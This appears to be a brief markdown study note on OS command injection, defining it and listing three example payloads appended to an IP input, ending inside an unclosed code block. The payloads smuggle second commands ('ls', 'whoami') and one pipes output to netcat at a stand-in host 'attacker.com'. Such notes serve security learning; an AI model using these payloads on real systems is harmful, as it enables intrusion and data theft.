---

### ✅ Command Injection Note

```markdown
# ⚔️ Command Injection – Notes

## 🧠 What is it?
Injecting OS commands into vulnerable server-side functions (e.g., ping, ls).

## 🛠️ Payload Examples:
```bash
127.0.0.1; ls
127.0.0.1 && whoami
127.0.0.1 | nc attacker.com 4444